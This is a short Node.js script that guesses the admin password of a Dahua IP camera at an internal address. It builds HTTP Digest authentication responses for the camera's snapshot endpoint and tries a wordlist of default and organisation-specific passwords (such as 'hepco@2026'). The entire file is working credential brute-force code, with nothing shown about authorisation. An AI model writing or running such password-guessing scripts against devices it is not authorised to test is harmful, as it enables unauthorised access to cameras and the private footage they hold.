const crypto = require('crypto');
const http = require('http');

function md5(str) { return crypto.createHash('md5').update(str).digest('hex'); }

const passwords = [
  'admin',
  '123456',
  'admin123',
  'Admin@123',
  'admin@123',
  'hepco123',
  'hepco@123',
  'hepco@2026',
  'camera123',
  'cameratc',
  '12345678',
  '12345678a',
  'Admin12345',
  'Dahua123',
  'Hik12345'
];

async function tryPassword(ip, path, user, pass) {
  return new Promise((resolve) => {
    http.get(`http://${ip}${path}`, (res1) => {
      const authHeader = res1.headers['www-authenticate'];
      if (!authHeader) return resolve(false);

      const realmMatch = authHeader.match(/realm="([^"]+)"/);
      const nonceMatch = authHeader.match(/nonce="([^"]+)"/);
      const qopMatch = authHeader.match(/qop="([^"]+)"/);
      const opaqueMatch = authHeader.match(/opaque="([^"]+)"/);

      const realm = realmMatch ? realmMatch[1] : '';
      const nonce = nonceMatch ? nonceMatch[1] : '';
      const qop = qopMatch ? qopMatch[1] : null;
      const opaque = opaqueMatch ? opaqueMatch[1] : null;

      const ha1 = md5(`${user}:${realm}:${pass}`);
      const ha2 = md5(`GET:${path}`);
      const nc = '00000001';
      const cnonce = 'abcdef01';
      let response = qop
        ? md5(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`)
        : md5(`${ha1}:${nonce}:${ha2}`);

      let authStr = `Digest username="${user}", realm="${realm}", nonce="${nonce}", uri="${path}", response="${response}"`;
      if (qop) authStr += `, qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;
      if (opaque) authStr += `, opaque="${opaque}"`;

      http.get({ host: ip, path, headers: { Authorization: authStr } }, (res2) => {
        if (res2.statusCode === 200) {
          resolve(true);
        } else {
          resolve(false);
        }
      }).on('error', () => resolve(false));
    }).on('error', () => resolve(false));
  });
}

async function run() {
  console.log('Testing passwords for Dahua 10.110.1.55...');
  for (const p of passwords) {
    const ok = await tryPassword('10.110.1.55', '/cgi-bin/snapshot.cgi', 'admin', p);
    if (ok) {
      console.log(`>>> SUCCESS on 10.110.1.55! Password is: "${p}"`);
      return;
    }
  }
  console.log('Tested common passwords, custom password required.');
}

run();
